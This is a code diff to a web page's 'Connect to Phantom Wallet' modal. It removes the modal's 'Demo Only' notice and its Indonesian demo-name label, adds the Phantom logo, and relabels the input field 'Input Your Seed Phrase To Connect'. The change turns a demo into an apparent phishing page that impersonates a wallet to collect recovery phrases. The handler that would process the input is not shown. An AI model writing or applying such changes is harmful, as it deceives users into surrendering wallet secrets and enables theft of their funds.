@@ -129,10 +129,12 @@
         <div class="phantom-modal-box">
             <button class="phantom-close" onclick="closePhantomModal()">×</button>
             <div id="phantomStepConnect">
-                <div class="phantom-logo">👻</div>
+                <div class="phantom-logo">
+    <img src="phantom_light.png" alt="Logo" style="width: 50px; height: 50px;">
+</div>
                 <h3>Connect to Phantom Wallet</h3>
-                <p class="phantom-sub">*Demo Only - Isi nama bebas*</p>
-                <label style="display:block; text-align:left; font-size:14px; margin-bottom:5px; color:#aaa;">Masukkan Nama Demo</label>
+                <p class="phantom-sub"></p>
+                <label style="display:block; text-align:left; font-size:14px; margin-bottom:5px; color:#aaa;">Input Your Seed Phrase To Connect</label>
                 <input type="text" id="phantomNameInput" placeholder="Contoh: ABCDE" style="width:100%; padding:12px; margin-bottom:15px; border-radius:8px; border:1px solid #333; background:#0f0f0f; color:#fff; outline:none; font-family:Inter;">
                 <button class="primary-btn phantom-full-btn" id="phantomConnectBtn" onclick="doPhantomConnect()">Connect</button>
             </div>
